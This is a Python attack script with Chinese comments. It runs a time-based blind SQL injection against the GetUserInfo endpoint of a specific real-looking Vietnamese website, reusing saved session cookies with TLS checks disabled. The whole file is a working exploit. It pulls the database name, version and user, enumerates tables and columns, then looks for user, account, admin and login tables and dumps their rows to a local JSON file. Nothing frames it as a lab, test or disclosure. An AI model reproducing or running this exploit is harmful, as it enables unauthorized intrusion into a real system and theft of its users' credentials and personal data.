#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib.parse
import json
import time
import urllib3
urllib3.disable_warnings()

class TimeBasedExtract:
    def __init__(self):
        self.base_url = "https://emsone.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.load_session()
        self.db_info = {}
        
    def load_session(self):
        try:
            with open('session_cookies.json', 'r') as f:
                cookies = json.load(f)
                self.session.cookies.update(cookies)
        except:
            pass
    
    def test_delay(self, payload):
        """测试延迟"""
        url = f"{self.base_url}/Account/GetUserInfo?id={urllib.parse.quote(payload)}"
        start = time.time()
        try:
            self.session.get(url, timeout=15)
            elapsed = time.time() - start
            return elapsed
        except:
            return 0
    
    def extract_char(self, query, position):
        """提取单个字符"""
        for i in range(32, 127):  # ASCII可打印字符
            char = chr(i)
            if char in ['%', "'", '"', '\\']:
                continue
            
            # 时间盲注payload
            payload = f"1' AND IF(ASCII(SUBSTRING(({query}), {position}, 1))={i}, SLEEP(3), 0)--"
            elapsed = self.test_delay(payload)
            
            if elapsed >= 2.5:
                return char
        
        return None
    
    def extract_string(self, query, max_len=50):
        """提取字符串"""
        result = ""
        
        for pos in range(1, max_len + 1):
            char = self.extract_char(query, pos)
            if char:
                result += char
                print(f"    [+] 位置 {pos}: {char} -> {result}")
            else:
                break
            time.sleep(0.5)  # 避免请求过快
        
        return result if result else None
    
    def extract_database_name(self):
        """提取数据库名"""
        print("[*] 提取数据库名...")
        db_name = self.extract_string("SELECT database()", max_len=50)
        if db_name:
            self.db_info['database'] = db_name
            print(f"    [+] 数据库名: {db_name}")
        return db_name
    
    def extract_version(self):
        """提取版本"""
        print("[*] 提取数据库版本...")
        version = self.extract_string("SELECT version()", max_len=100)
        if version:
            self.db_info['version'] = version
            print(f"    [+] 版本: {version}")
        return version
    
    def extract_user(self):
        """提取用户"""
        print("[*] 提取当前用户...")
        user = self.extract_string("SELECT user()", max_len=50)
        if user:
            self.db_info['user'] = user
            print(f"    [+] 用户: {user}")
        return user
    
    def extract_table_count(self):
        """提取表数量"""
        print("[*] 提取表数量...")
        
        # 先提取数量
        count_query = "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()"
        count_str = self.extract_string(count_query, max_len=10)
        
        if count_str and count_str.isdigit():
            count = int(count_str)
            print(f"    [+] 表数量: {count}")
            return count
        return 0
    
    def extract_table_name(self, index):
        """提取指定索引的表名"""
        query = f"SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {index},1"
        table_name = self.extract_string(query, max_len=50)
        return table_name
    
    def extract_tables(self, limit=10):
        """提取表名列表"""
        print(f"\n[*] 提取表名列表 (限制{limit}个)...")
        
        tables = []
        for i in range(limit):
            print(f"\n[*] 提取第 {i+1} 个表...")
            table_name = self.extract_table_name(i)
            if table_name:
                tables.append(table_name)
                print(f"    [+] 表名: {table_name}")
            else:
                break
            time.sleep(1)
        
        self.db_info['tables'] = tables
        return tables
    
    def extract_column_names(self, table_name, limit=10):
        """提取列名"""
        print(f"\n[*] 提取表列名: {table_name} (限制{limit}个)...")
        
        columns = []
        for i in range(limit):
            query = f"SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' AND table_schema=database() LIMIT {i},1"
            col_name = self.extract_string(query, max_len=50)
            if col_name:
                columns.append(col_name)
                print(f"    [+] 列名: {col_name}")
            else:
                break
            time.sleep(1)
        
        return columns
    
    def extract_table_data(self, table_name, columns, limit=5):
        """提取表数据"""
        print(f"\n[*] 提取表数据: {table_name} (前{limit}条)...")
        
        if not columns:
            return None
        
        # 提取每条记录
        records = []
        for row_idx in range(limit):
            print(f"\n[*] 提取第 {row_idx+1} 条记录...")
            record = {}
            
            for col in columns[:5]:  # 限制列数
                query = f"SELECT {col} FROM {table_name} LIMIT {row_idx},1"
                value = self.extract_string(query, max_len=100)
                if value:
                    record[col] = value
                    print(f"    [+] {col}: {value[:50]}")
                time.sleep(0.5)
            
            if record:
                records.append(record)
            else:
                break
        
        return records
    
    def find_user_tables(self):
        """查找用户相关表"""
        tables = self.db_info.get('tables', [])
        user_tables = []
        
        keywords = ['user', 'account', 'admin', 'customer', 'member', 'login', 'auth']
        for table in tables:
            if any(kw in table.lower() for kw in keywords):
                user_tables.append(table)
        
        return user_tables
    
    def extract_all_user_data(self):
        """提取所有用户数据"""
        print("\n[*] 提取用户数据...")
        
        user_tables = self.find_user_tables()
        if not user_tables:
            print("    [-] 未找到用户相关表")
            return
        
        print(f"    [+] 发现用户表: {user_tables}")
        
        for table in user_tables[:3]:  # 限制前3个表
            columns = self.extract_column_names(table, limit=10)
            if columns:
                self.db_info[f'{table}_columns'] = columns
                data = self.extract_table_data(table, columns, limit=5)
                if data:
                    self.db_info[f'{table}_data'] = data
    
    def save_results(self):
        """保存结果"""
        with open('database_time_extracted.json', 'w', encoding='utf-8') as f:
            json.dump(self.db_info, f, indent=2, ensure_ascii=False)
        
        print(f"\n[+] 数据已保存到 database_time_extracted.json")
    
    def run_all(self):
        """执行所有提取"""
        print("="*60)
        print("时间盲注数据库提取")
        print("="*60)
        
        # 先测试延迟是否有效
        print("\n[*] 测试延迟...")
        test_payload = "1' AND SLEEP(3)--"
        elapsed = self.test_delay(test_payload)
        print(f"    延迟测试: {elapsed:.2f}s")
        
        if elapsed < 2.5:
            print("    [-] 延迟不明显，可能被过滤")
            return
        
        # 提取基础信息
        self.extract_database_name()
        self.extract_version()
        self.extract_user()
        
        # 提取表
        self.extract_tables(limit=15)
        
        # 提取用户数据
        self.extract_all_user_data()
        
        self.save_results()
        
        print("\n" + "="*60)
        print("提取完成")
        print("="*60)

if __name__ == "__main__":
    extractor = TimeBasedExtract()
    extractor.run_all()